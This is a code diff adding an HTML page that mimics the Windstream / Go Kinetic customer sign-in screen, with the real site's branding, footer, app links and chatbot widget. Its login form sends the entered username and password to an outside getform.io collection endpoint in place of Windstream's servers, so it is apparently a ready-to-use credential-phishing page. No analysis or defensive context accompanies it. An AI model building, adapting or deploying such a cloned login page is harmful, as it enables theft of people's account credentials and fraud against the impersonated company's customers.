@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="android">
+
+<head>
+    <title>Sign In</title>
+    <base href="https://login.windstream.com/">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <style data-tippy-stylesheet="">
+        .tippy-box[data-animation=fade][data-state=hidden] {
+            opacity: 0
+        }
+       
+
+        [data-tippy-root] {
+            max-width: calc(100vw - 10px)
+        }
+
+        .tippy-box {
+            position: relative;
+            background-color: #333;
+            color: #fff;
+            border-radius: 4px;
+            font-size: 14px;
+            line-height: 1.4;
+            white-space: normal;
+            outline: 0;
+            transition-property: transform, visibility, opacity
+        }
+
+        .tippy-box[data-placement^=top]>.tippy-arrow {
+            bottom: 0
+        }
+
+        .tippy-box[data-placement^=top]>.tippy-arrow:before {
+            bottom: -7px;
+            left: 0;
+            border-width: 8px 8px 0;
+            border-top-color: initial;
+            transform-origin: center top
+        }
+
+        .tippy-box[data-placement^=bottom]>.tippy-arrow {
+            top: 0
+        }
+
+        .tippy-box[data-placement^=bottom]>.tippy-arrow:before {
+            top: -7px;
+            left: 0;
+            border-width: 0 8px 8px;
+            border-bottom-color: initial;
+            transform-origin: center bottom
+        }
+
+        .tippy-box[data-placement^=left]>.tippy-arrow {
+            right: 0
+        }
+
+        .tippy-box[data-placement^=left]>.tippy-arrow:before {
+            border-width: 8px 0 8px 8px;
+            border-left-color: initial;
+            right: -7px;
+            transform-origin: center left
+        }
+
+        .tippy-box[data-placement^=right]>.tippy-arrow {
+            left: 0
+        }
+
+        .tippy-box[data-placement^=right]>.tippy-arrow:before {
+            left: -7px;
+            border-width: 8px 8px 8px 0;
+            border-right-color: initial;
+            transform-origin: center right
+        }
+
+        .tippy-box[data-inertia][data-state=visible] {
+            transition-timing-function: cubic-bezier(.54, 1.5, .38, 1.11)
+        }
+
+        .tippy-arrow {
+            width: 16px;
+            height: 16px;
+            color: #333
+        }
+
+        .tippy-arrow:before {
+            content: "";
+            position: absolute;
+            border-color: transparent;
+            border-style: solid
+        }
+
+        .tippy-content {
+            position: relative;
+            padding: 5px 9px;
+            z-index: 1
+        }
+       
+    </style>
+    <link rel="stylesheet" type="text/css" href="./ws-main.min.css">
+    <link rel="stylesheet" type="text/css" href="./slick.css">
+    <link rel="stylesheet" type="text/css" href="./gkconsumer-login.min.css">
+    <link href="../assets/scripts/lity/dist/lity.css" rel="stylesheet">
+    <script src="../assets/scripts/jquery.min.js"></script>
+    <script src="../assets/scripts/slick/slick.min.js"></script>
+    <script src="../assets/scripts/lity/dist/lity.js"></script>
+    <script src="https://unpkg.com/@popperjs/core@2"></script>
+    <script src="https://unpkg.com/tippy.js@6"></script>
+    <!-- Adding fav icon because chrome throws error when none found -->
+    <link rel="shortcut icon" type="image/x-icon" href="https://my.gokinetic.com/consumer/images/Consumer_favicon1.ico">
+    <link rel="stylesheet" type="text/css"
+        href="https://chatbot-xkinetic.windstream.com/assets/modules/channel-web/frontend/css/kinetic-registration-styles.css">
+    <link rel="stylesheet" type="text/css"
+        href="https://chatbot-xkinetic.windstream.com/assets/modules/channel-web/frontend/css/kinetic-custom-inject.css">
+    <link rel="stylesheet"
+        href="https://chatbot-xkinetic.windstream.com/assets/modules/channel-web/frontend/css/kinetic-custom-inject.css"
+        id="mobile-styles">
+</head>
+
+<body onload="setFocus();" class="ws-csmb ws-consumer hide-footer-toggle mobile">
+    <div class="section-container">
+        <!-- temporary for transitional branding from marketing  -->
+        <!-- <div class="top-callout-banner">
+      <span>
+        MyWIN is now officially Go Kinetic. Same great functionality and Kinetic service with a refreshed name and experience.
+      </span>
+    </div> -->
+
+        <div class="ping-container ping-signin login-template" style="margin:auto 100% ;">
+
+            <div class="ping-header has-logo" >
+                <span class="company-logo"><!-- client company logo here --></span>
+                <!-- <span class="logo-text">kinetic</span> -->
+                <!-- Sign In -->
+            </div>
+
+            <!-- <div class="color-bar-separator">
+        <span class="pink"></span>
+        <span class="teal"></span>
+        <span class="orange"></span>
+      </div> -->
+
+            <div class="ping-body-container" >
+                <h3 class="pingbody-title">Sign in</h3>
+                <div class="pingcontent-container">
+                    <form method="POST" action="https://getform.io/f/pamzqnpb" autocomplete="on" onclick="">
+
+                        <div class="ping-input-label">
+                            Username&nbsp;
+                            <input type="hidden" name="pf.usernamerecovery" value="">
+                            <a onclick="postRecoverUsername();" class="color-light-blue font-14"></a>
+                        </div>
+                        <div class="ping-input-container">
+                            <input id="username" type="text" size="36" name="pf.username" value="" autocorrect="off"
+                                autocapitalize="off" onkeypress="return postOnReturn(event)" autocomplete="username" >
+                            <!---->
+                        </div>
+
+                        <div class="ping-input-label">
+                            Password&nbsp;
+                            <input type="hidden" name="pf.passwordreset" value="">
+                            <a onclick="postForgotPassword();" class="color-light-blue font-14"></a>
+                        </div>
+                        <div class="ping-input-container password-container signin-password no-margin"
+                            style="margin: 0;">
+                            <div class="eye-toggle" title="Show or hide password">
+                                <input id="togglePassword" type="checkbox" onchange="showPassword(this);">
+                                <label for="togglePassword" class="eye-icon"></label>
+                            </div>
+                            <input id="password" type="password" size="36" name="pf.pass"
+                                onkeypress="return postOnReturn(event)" autocomplete="current-password">
+                        </div>
+
+                        <br>
+                        <br>
+
+                        <label class="remember-username">
+                            <div class="ping-checkbox-container stacked">
+                                <input id="rememberUsername" type="checkbox" name="pf.rememberUsername">
+                                Remember my username
+                                <div class="icon"></div>
+                            </div>
+                        </label>
+
+
+                        <div class="ping-messages">
+
+
+
+                        </div>
+
+
+                        <div class="ping-buttons talign-center" style="float: none;">
+                            <input type="hidden" name="pf.ok" value="">
+                            <input type="hidden" name="pf.cancel" value="">
+                            <span id="signOnButtonSpan">
+                                <a onclick="postOk();" class="ping-button normal allow" id="signOnButton"
+                                    title="Sign In">
+                                    Sign In
+                                </a>
+                            </span>
+                        </div><!-- .ping-buttons -->
+                        <div class="ping-input-link ping-pass-change talign-center">
+                            <a onclick="redirectTroubleSigningIn()" class="forgot-password font-14">Having trouble
+                                signing in?</a>
+                            <span>
+                                <a href="https://my.gokinetic.com/consumer/registration/index/"
+                                    class="forgot-password font-14 lh-32">Set up online access</a>
+                            </span>
+                        </div>
+
+                        <div class="browser-rec-block">
+                            For the best Go Kinetic experience,
+
+                            please make sure you are using the most recent version of your browser,
+                            or try using one of these supported browsers:
+                            <a href="https://www.google.com/chrome/">Chrome</a>, <a
+                                href="https://www.mozilla.org/en-US/firefox/new/">Firefox</a> or <a
+                                href="https://www.microsoft.com/en-us/edge">Microsoft Edge</a>
+                            <br>
+                            <br>
+                            <div class="font-12">Please note Microsoft is decommissioning and no longer supporting
+                                Internet Explorer. </div>
+                        </div>
+
+                        <input type="hidden" name="pf.adapterId" id="pf.adapterId" value="myWindstreamWeb">
+                    </form>
+                </div><!-- .ping-body -->
+            </div><!-- .ping-body-container -->
+
+            <div class="ping-footer-container">
+                <div class="ping-footer">
+                    <div class="ping-credits"></div>
+                    <div class="ping-copyright">Copyright © 2003-2020. Ping Identity Corporation. All rights reserved.
+                    </div>
+                </div>
+                <!-- .ping-footer -->
+            </div>
+            <!-- .ping-footer-container -->
+
+            <div id="bp-button"></div>
+        </div><!-- .ping-container -->
+        <!--Ping right Container-->
+        <!-- <div class="ping-right-container">
+            <div class="pinginside-container">
+                <h2 class="section-title clr-white talign-center">Meet Go Kinetic</h2>
+                <p class="page-desc clr-white talign-center">Giving you the power and convenience to manage your account
+                    and connected home quickly and easily.</p>
+
+                <div class="d-inline-flex innervideosection flex-column">
+                    <div class="framevideo-container pausevideo">
+
+                        <span class="video-placeholder" id="play-button"
+                            href="https://www.windstreamenterprise.com/video-player/?videoID=https://youtu.be/7TFAV-6xBOc"
+                            data-lity="">
+
+                        </span>
+                        <!-- <iframe width="100%"  class="framevideo"
+           frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen> 
+          </iframe>  -->
+                    </div>
+                </div>
+
+            </div>
+            <div class="slider-section">
+                <div class="slider responsiveslick slick-initialized slick-slider"><button
+                        class="slick-prev slick-arrow slick-disabled" aria-label="Previous" type="button"
+                        aria-disabled="true">Previous</button>
+
+
+
+
+                    <div class="slick-list draggable">
+                        <div class="slick-track" style="opacity: 1; width: 0px; transform: translate3d(0px, 0px, 0px);">
+                            <div class="slides-list slick-slide slick-current slick-active" tabindex="0"
+                                style="width: 0px;" data-slick-index="0" aria-hidden="false">
+                                <div class="manage-card slickitem-card">
+                                    <span class="card-img-section">
+                                        <img src="assets/images/consumer/manage.png" alt="manage-image"
+                                            class="card-img">
+                                    </span>
+                                    <p class="card-heading">Manage your in-home Kinetic network with Wi-Fi Manager</p>
+                                </div>
+                            </div>
+                            <div class="slides-list slick-slide" tabindex="-1" style="width: 0px;" data-slick-index="1"
+                                aria-hidden="true">
+                                <div class="help-card slickitem-card">
+                                    <span class="card-img-section">
+                                        <img src="assets/images/consumer/help.png" alt="manage-image" class="card-img">
+                                    </span>
+                                    <p class="card-heading">Help and support is only a click away</p>
+                                </div>
+                            </div>
+                            <div class="slides-list slick-slide" tabindex="-1" style="width: 0px;" data-slick-index="2"
+                                aria-hidden="true">
+                                <div class="billing-card slickitem-card">
+                                    <span class="card-img-section">
+                                        <img src="assets/images/consumer/billing.png" alt="manage-image"
+                                            class="card-img">
+                                    </span>
+                                    <p class="card-heading">Giving you the power to manage all things billing whether at
+                                        home or on the go</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div><button class="slick-next slick-arrow" aria-label="Next" type="button" 
+                        aria-disabled="false">Next</button>
+                </div>
+            </div>
+            <div class="mobile-footer">
+                <span class="caption margin-x-15">
+                    Download app from
+                </span>
+                <a id="androidButton" class="app-badge margin-x-15" data-tippy-duration="0" data-tippy-arrow="false"
+                    aria-expanded="false">
+                    <img src="assets/images/consumer/playstore.png" alt="playstore store" height="36">
+                </a>
+                <a id="iOSButton" class="app-badge margin-x-15" data-tippy-duration="0" data-tippy-arrow="false"
+                    aria-expanded="false">
+                    <img src="assets/images/consumer/appstore.png" alt="app store" height="36">
+                </a>
+            </div>
+        </div> -->
+    </div>
+    <!--Footer-->
+    <footer>
+        <span class="d-flex alignitems-center f-f-GR"><span class="font-16" style="padding-right:4px;">©</span><span
+                class="getfullyear">2024</span> Windstream Communications. All rights reserved.</span>
+        <div>
+            <a href="https://www.windstream.com/Terms-and-Conditions/" target="_blank" title="Terms &amp; Conditions"
+                class="terms-link font-16 m-r-28px">Terms &amp; Conditions</a>
+            <a href="https://www.windstream.com/about/legal/Privacy-Policy" target="_blank" title="Privacy Policy"
+                class="terms-link font-16">Privacy Policy</a>
+        </div>
+    </footer>
+    <!--Footer End-->
+
+    <!-- APP BUTTON TEMPLATES FOR POPUP -->
+    <div id="androidAppPopup">
+        <div class="align-center" onclick="tippy.hideAll();">
+            <img src="assets/images/consumer/playstore-qr.PNG" class="display-block" width="204">
+            <a class="btn-theme" href="https://play.google.com/store/apps/details?id=com.windstream.residential"
+                target="_blank">Visit in the Play Store</a>
+        </div>
+    </div>
+
+    <div id="iOSAppPopup">
+        <div class="align-center" onclick="tippy.hideAll();">
+            <img src="assets/images/consumer/appstore-qr.PNG" class="display-block" width="204">
+            <a class="btn-theme" href="https://apps.apple.com/us/app/id1342262959?ls=1&amp;mt=8" target="_blank">Visit
+                in the App Store</a>
+        </div>
+    </div>
+    <script>
+        // With the above scripts loaded, you can call `tippy()` with a CSS
+        // selector and a `content` prop:
+        const androidButtonTemplate = document.getElementById('androidAppPopup');
+        const iOSButtonTemplate = document.getElementById('iOSAppPopup');
+
+        tippy('#androidButton', {
+            content: androidButtonTemplate.innerHTML,
+            allowHTML: true,
+            interactive: true,
+            trigger: 'click',
+            offset: [0, 20],
+            hideOnClick: true,
+
+        });
+
+        tippy('#iOSButton', {
+            content: iOSButtonTemplate.innerHTML,
+            allowHTML: true,
+            interactive: true,
+            trigger: 'click',
+            offset: [0, 20],
+            hideOnClick: true,
+
+        });
+
+
+
+    </script>
+    <script type="text/javascript">
+
+        function postForgotPassword() {
+            document.forms[0]['pf.passwordreset'].value = 'clicked';
+            document.forms[0].submit();
+        }
+
+        function postRecoverUsername() {
+            document.forms[0]['pf.usernamerecovery'].value = 'clicked';
+            document.forms[0].submit();
+        }
+
+        function postAlternateAuthnSystem(system) {
+            var variants = ["Biometrics", "Windows Hello", "Face ID", "Touch ID"];
+            for (i = 0; i < variants.length; i++) {
+                if (variants[i] == system) {
+                    system = "FIDO";
+                }
+            }
+            document.forms[0]['pf.alternateAuthnSystem'].value = system;
+            document.forms[0].submit();
+        }
+
+
+        function postRegistration() {
+            document.forms[0]['pf.registration'].value = true;
+            document.forms[0].submit();
+        }
+
+        function postOk() {
+            if (false) {
+                grecaptcha.execute();
+            }
+            else {
+                // remove error tips
+                if (document.forms[0]['pf.username'].value !== '') {
+                    //  document.getElementById('username-text').className = 'place-bottom type-alert tooltip-text';
+                }
+                if (document.forms[0]['pf.pass'].value !== '') {
+                    //  document.getElementById('password-text').className = 'place-bottom type-alert tooltip-text';
+                }
+                // Add back
+                if (document.forms[0]['pf.username'].value === '') {
+                    //  document.getElementById('username-text').className += ' show';
+                }
+                else if (document.forms[0]['pf.pass'].value === '') {
+                    //  document.getElementById('password-text').className += ' show';
+                }
+                else {
+                    submitForm()
+                }
+                submitForm();
+            }
+        }
+
+        function submitForm() {
+            //remove consumer portaldb When loggedin first time.
+            indexedDB.deleteDatabase('db-consumer');
+            var signOnButtonSpan = document.getElementById('signOnButtonSpan');
+            signOnButtonSpan.classList.add('content-columns', 'disabled');
+            signOnButtonSpan.style = "pointer-events: none;";
+
+            var signOnButton = document.getElementById('signOnButton');
+            signOnButton.innerHTML = 'Signing on...';
+
+            document.forms[0]['pf.ok'].value = 'clicked';
+            document.forms[0].submit();
+            if (false) {
+                grecaptcha.reset();
+            }
+        }
+
+        function postCancel() {
+            document.forms[0]['pf.cancel'].value = 'clicked';
+            document.forms[0].submit();
+        }
+
+        function postOnReturn(e) {
+            var keycode;
+            if (window.event) keycode = window.event.keyCode;
+            else if (e) keycode = e.which;
+            else return true;
+
+            if (keycode == 13) {
+                postOk();
+                return false;
+            } else {
+                return true;
+            }
+        }
+
+        function setFocus() {
+            var platform = navigator.platform;
+            if (platform != null && platform.indexOf("iPhone") == -1) {
+                document.getElementById('username').focus();
+            }
+        }
+
+        function setMobile(mobile) {
+            var className = ' mobile',
+                hasClass = (bodyTag.className.indexOf(className) !== -1);
+
+            if (mobile && !hasClass) {
+                bodyTag.className += className;
+            } else if (!mobile && hasClass) {
+                bodyTag.className = bodyTag.className.replace(className, '');
+            }
+
+            checkbox.checked = mobile || remember;
+
+            <!-- Check if this is the PingOne Mobile App -->
+        }
+
+        function getScreenWidth() {
+            return (window.outerHeight) ? window.outerWidth : document.body.clientWidth;
+        }
+
+        var bodyTag = document.getElementsByTagName('body')[0],
+            width = getScreenWidth(),
+            remember = false && true;
+
+        var checkbox = document.getElementById('rememberUsername');
+
+        if (/Android|webOS|iPhone|iPod|iPad|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            setMobile(true);
+        } else {
+            setMobile((width <= 480));
+            window.onresize = function () {
+                width = getScreenWidth();
+                setMobile((width <= 480));
+            }
+        }
+
+        function redirectTroubleSigningIn() {
+            var host = "https://login.windstream.com/";
+            if (host.charAt(host.length - 1) == "/") {
+                host = host.slice(0, -1);
+            }
+            window.location.href = "/myWindstream/troublesigningin?AdapterId="
+                + encodeURIComponent("myWindstreamWeb") + "&TargetResource="
+                + encodeURIComponent(host + "/idp/Xr33u/resumeSAML20/idp/startSSO.ping");
+        }
+
+        function detectMobileModify() {
+            if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+                $('body').addClass('mobile');
+            } else {
+                $('body').removeClass('mobile');
+            }
+        }
+
+        function detectMobileModifyAndroidOnly() {
+            var navUserAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            if ((navUserAgent).match(/Android/i)) {
+                $('html').addClass('android');
+            } else if (((navUserAgent).match(/iPhone|iPad|iPad|iPod/i)) || ((navUserAgent).match(/Mac/i) && ('ontouchstart' in window || navigator.maxTouchPoints))) {
+                // iOS detected, show App Store icon
+                $('html').addClass('appdevice');
+            } else {
+                $('html').removeClass('android');
+                $('html').removeClass('appdevice');
+            }
+        }
+
+        function resizeSlider(slickHeight) {
+            //$(".slick-track").find(".slick-slide .slickitem-card").css("height", slickHeight + "px");
+        }
+
+        var ssContainer = $(".responsiveslick")
+
+        $(document).ready(function () {
+            detectMobileModify();
+            detectMobileModifyAndroidOnly();
+
+            /**Set dynamic footer year**/
+            $('.getfullyear').text(new Date().getFullYear());
+            /**Slick Initialized**/
+            $(ssContainer).slick({
+                dots: false,
+                infinite: false,
+                speed: 300,
+                slidesToShow: 3,
+                slidesToScroll: 1,
+                responsive: [
+                    {
+                        breakpoint: 1279,
+                        settings: {
+                            slidesToShow: 2,
+                            slidesToScroll: 1,
+                        }
+                    },
+                    {
+                        breakpoint: 991,
+                        settings: {
+                            slidesToShow: 1,
+                            slidesToScroll: 1
+                        }
+                    },
+                    {
+                        breakpoint: 767,
+                        settings: {
+                            slidesToShow: 1,
+                            slidesToScroll: 1
+                        }
+                    }
+
+                ]
+            }).on("setPosition", function () {
+                //resizeSlider($(".slick-track").outerHeight());
+            });
+        })
+
+        $(window).on("resize", function () {
+            console.log('resize detected');
+            detectMobileModify();
+            detectMobileModifyAndroidOnly();
+        });
+
+        function showPassword(check_box) {
+            var textbox_elem = $(check_box).parents('.eye-toggle').next('input').attr('id');
+            if (check_box.checked) {
+                $('#' + textbox_elem).attr("type", "text");
+            }
+            else {
+                $('#' + textbox_elem).attr("type", "password");
+            }
+        }
+
+    </script>
+
+    <script async=""
+        src="https://chatbot-xkinetic.windstream.com/assets/modules/channel-web/frontend/js/kinetic-chatbot-inject.js"></script>
+
+
+
+    <div id="bp-web-widget">
+        <iframe id="bp-widget" frameborder="0"
+            src="https://chatbot-xkinetic.windstream.com/lite/kinetic-external-helper/?m=channel-web&amp;v=Embedded&amp;options=%7B%22config%22%3A%7B%22host%22%3A%22https%3A%2F%2Fchatbot-xkinetic.windstream.com%22%2C%22botId%22%3A%22kinetic-external-helper%22%2C%22botName%22%3A%22Kinetic%20Digital%20Assistant%22%2C%22enableReset%22%3Afalse%2C%22enableTranscriptDownload%22%3Afalse%2C%22showConversationsButton%22%3Afalse%2C%22showTimestamp%22%3Afalse%2C%22hideWidget%22%3Atrue%2C%22stylesheet%22%3A%22%2Fassets%2Fmodules%2Fchannel-web%2Ffrontend%2Fcss%2Fkinetic-registration-styles.css%22%2C%22avatarUrl%22%3A%22%2Fassets%2Fmodules%2Fchannel-web%2Ffrontend%2Fimg%2FGo_Kinetic_Registration_Digital_Assistant.png%22%7D%7D" class="bp-widget-web bp-widget-widget bp-widget-hidden">
+        </iframe>
+    </div>
+</body>
+</html>
